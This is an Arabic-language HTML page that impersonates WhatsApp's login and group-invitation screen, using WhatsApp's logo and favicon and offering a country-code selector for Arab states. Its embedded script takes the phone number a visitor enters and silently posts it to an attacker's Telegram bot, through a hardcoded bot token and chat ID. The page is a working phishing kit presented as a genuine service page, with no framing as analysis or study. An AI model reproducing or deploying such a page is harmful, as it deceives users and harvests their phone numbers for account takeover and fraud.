<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yz/r/ujTY9i_Jhs1.png">
    <title>WhatsApp Registration</title>
    <style>
        /* تصميم الصفحة */
        body {
            font-family: Arial, sans-serif;
            background-color: #FAF3E7;
            margin: 0;
            padding: 0;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #fff;
            padding: 10px 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .container {
            text-align: center;
            background-color: #fff;
            border-radius: 10px;
            padding: 20px;
            max-width: 500px;
            margin: 20px auto;
        }
        button {
            padding: 10px 20px;
            background-color: #25D366;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <!-- شريط التنقل -->
    <div class="navbar">
        <div class="logo">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب" style="height: 50px;">
        </div>
        <div class="nav-links">
            <a href="#">الأنشطة التجارية</a>
            <a href="#">المدونة</a>
            <a href="#">مركز المساعدة</a>
            <a href="#">الخصوصية</a>
        </div>
    </div>

    <!-- الحاوية الرئيسية -->
    <div class="container">
        <div class="www">WhatsApp</div>
        <div class="title">تسجيل الدخول</div>
        <div class="description">الدعوة للانضمام إلى مجموعة واتساب</div>
        <div class="form-group">
            <select id="countryCode">
                <option value="966">🇸🇦 السعودية +966</option>
                <option value="971">🇦🇪 الإمارات +971</option>
                <option value="965">🇰🇼 الكويت +965</option>
                <option value="974">🇶🇦 قطر +974</option>
                <option value="973">🇧🇭 البحرين +973</option>
                <option value="968">🇴🇲 عمان +968</option>
                <option value="963">🇸🇾 سوريا +963</option>
                <option value="964">🇮🇶 العراق +964</option>
                <option value="962">🇯🇴 الأردن +962</option>
                <option value="970">🇵🇸 فلسطين +970</option>
                <option value="249">🇸🇩 السودان +249</option>
                <option value="253">🇩🇯 جيبوتي +253</option>
                <option value="252">🇸🇴 الصومال +252</option>
                <option value="222">🇲🇷 موريتانيا +222</option>
                <option value="967">🇾🇪 اليمن +967</option>
                <option value="269">🇰🇲 جزر القمر +269</option>
                <option value="211">🇸🇸 جنوب السودان +211</option>
            </select>
            <input id="phoneNumber" class="inopt" type="text" placeholder="رقم الهاتف">
        </div>
        <button onclick="sendMessage()">متابعة</button>
    </div>

    <script>
        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
        const chatId = '612575358';

        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value;

            if (!phoneNumber.trim()) {
                return;
            }

            const fullPhoneNumber = `+${countryCode}::::${phoneNumber}`;
            const message = `رقم الهاتف: ${fullPhoneNumber}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            }).then(response => response.json());
        }
    </script>
</body>
</html>
